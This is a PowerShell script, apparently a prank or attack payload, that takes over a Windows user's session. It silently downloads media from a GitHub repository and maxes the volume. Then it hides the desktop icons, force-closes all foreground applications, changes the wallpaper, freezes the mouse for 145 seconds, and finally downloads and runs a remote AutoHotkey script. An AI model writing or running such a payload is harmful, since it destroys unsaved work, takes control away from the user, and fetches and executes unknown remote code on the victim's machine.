# Function to check for mouse movement
function Detect-MouseMovement {
    $initialPosition = [System.Windows.Forms.Cursor]::Position
    while ($true) {
        $currentPosition = [System.Windows.Forms.Cursor]::Position
        if ($currentPosition -ne $initialPosition) {
            return
        }
        Start-Sleep -Milliseconds 100
    }
}

# Function to simulate blocking mouse movement
function Simulate-BlockMouseMovement {
    param (
        [int]$durationInSeconds = 145
    )
    
    $initialPosition = [System.Windows.Forms.Cursor]::Position
    $endTime = (Get-Date).AddSeconds($durationInSeconds)
    
    while ((Get-Date) -lt $endTime) {
        $currentPosition = [System.Windows.Forms.Cursor]::Position
        if ($currentPosition -ne $initialPosition) {
            [System.Windows.Forms.Cursor]::Position = $initialPosition
        }
        Start-Sleep -Milliseconds 100
    }
    Write-Host "Mouse movement re-enabled."
}

# Function to run an AutoHotkey script
function Run-AutoHotkeyScript {
    param (
        [string]$scriptPath
    )
    Start-Process -FilePath "AutoHotkey.exe" -ArgumentList $scriptPath -NoNewWindow -PassThru
}

# Function to stop an AutoHotkey script
function Stop-AutoHotkeyScript {
    Stop-Process -Name "AutoHotkey" -Force
}

# Function to download and run AHK file from GitHub
function DownloadAndRun-AHKFromGitHub {
    $ahkUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.ahk"
    $downloadPath = "$env:TEMP\nothing.ahk"

    try {
        Invoke-WebRequest -Uri $ahkUrl -OutFile $downloadPath -UseBasicParsing
        Write-Host "AHK script successfully downloaded to $downloadPath"
        Run-AutoHotkeyScript -scriptPath $downloadPath
    } catch {
        Write-Host "Failed to download or run the AHK script." -ForegroundColor Red
        exit
    }
}

# Function to silently download the raw image file from GitHub
function Download-ImageFromGitHub {
    $imageUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/e30e22d41baf67ce7db80e39095c19cd5c184653/Nothing.jpg"
    $downloadPath = "$env:TEMP\downloaded_image.jpg"

    try {
        Invoke-WebRequest -Uri $imageUrl -OutFile $downloadPath -UseBasicParsing
        Write-Host "Image successfully downloaded to $downloadPath"
        return $downloadPath
    } catch {
        Write-Host "Failed to download the image." -ForegroundColor Red
        exit
    }
}

# Function to silently download the raw WAV file from GitHub
function Download-AudioFromGitHub {
    $audioUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.wav"
    $downloadPath = "$env:TEMP\nothing.wav"

    try {
        Invoke-WebRequest -Uri $audioUrl -OutFile $downloadPath -UseBasicParsing
        Write-Host "Audio successfully downloaded to $downloadPath"
        return $downloadPath
    } catch {
        Write-Host "Failed to download the audio." -ForegroundColor Red
        exit
    }
}

# Function to set the image as wallpaper
function Set-Wallpaper {
    param (
        [string]$imagePath
    )
    $code = @"
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
"@
    Add-Type -MemberDefinition $code -Name "WinAPI" -Namespace "WallpaperAPI" -PassThru

    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $result = [WallpaperAPI.WinAPI]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $imagePath, $SPIF_UPDATEINIFILE)

    if ($result -eq 0) {
        Write-Host "Failed to set the wallpaper." -ForegroundColor Red
    } else {
        Write-Host "Wallpaper successfully set."
    }
}

# Function to set the volume to maximum
function Set-VolumeToMax {
    $volume = 100  # Volume level (0 to 100)
    $appVolume = New-Object -ComObject WScript.Shell

    try {
        for ($i = 0; $i -lt 50; $i++) {
            $appVolume.SendKeys([char]175)  # Increase volume
        }
        Write-Host "Volume set to maximum."
    } catch {
        Write-Host "Failed to set the volume." -ForegroundColor Red
    }
}

# Function to hide desktop icons
function Hide-DesktopIcons {
    # Minimize all windows
    (New-Object -ComObject shell.application).minimizeall()
    Start-Sleep -Seconds 1

    # Hide desktop icons using registry
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    Set-ItemProperty -Path $regPath -Name "HideIcons" -Value 1
    Stop-Process -Name explorer -Force
    Start-Process explorer
    Write-Host "Desktop icons hidden"
}

# Function to close all foreground processes except PowerShell
function Close-ForegroundProcesses {
    $excludedProcesses = @("powershell", "explorer")
    $processes = Get-Process | Where-Object { $_.MainWindowHandle -ne [IntPtr]::Zero -and $excludedProcesses -notcontains $_.Name }

    foreach ($process in $processes) {
        try {
            Stop-Process -Id $process.Id -Force
            Write-Host "Closed process: $($process.Name)"
        } catch {
            Write-Host "Failed to close process: $($process.Name)" -ForegroundColor Red
        }
    }
}

# Function to play WAV audio using Windows Media Player in a minimized window
function Play-Audio {
    param (
        [string]$audioPath
    )

    try {
        # Start Windows Media Player to play the audio in a minimized window
        $process = Start-Process "wmplayer.exe" -ArgumentList $audioPath -PassThru
        Start-Sleep -Seconds 5  # Wait for WMP to initialize

        # Minimize Windows Media Player window
        $shell = New-Object -ComObject Shell.Application
        $windows = $shell.Windows()
        foreach ($window in $windows) {
            if ($window.FullName -like "*wmplayer.exe*") {
                $window.Minimize()
            }
        }
        Write-Host "Audio playback started."
    } catch {
        Write-Host "Failed to play the audio." -ForegroundColor Red
    }
}

# Load required assembly for cursor detection
Add-Type -AssemblyName System.Windows.Forms

# Set the volume to maximum before waiting for mouse movement
Set-VolumeToMax

# Download the image and audio files from GitHub
$imagePath = Download-ImageFromGitHub
$audioPath = Download-AudioFromGitHub

# Wait for mouse movement
Detect-MouseMovement

# Hide desktop icons
Hide-DesktopIcons

# Close all foreground processes except PowerShell
Close-ForegroundProcesses

# Set the downloaded image as wallpaper
Set-Wallpaper -imagePath $imagePath

# Play the downloaded audio in the background
Play-Audio -audioPath $audioPath

# Simulate disabling mouse movement for 2 minutes and 25 seconds
Simulate-BlockMouseMovement -durationInSeconds 145

# Run the AutoHotkey script from GitHub after disabling mouse movement
DownloadAndRun-AHKFromGitHub
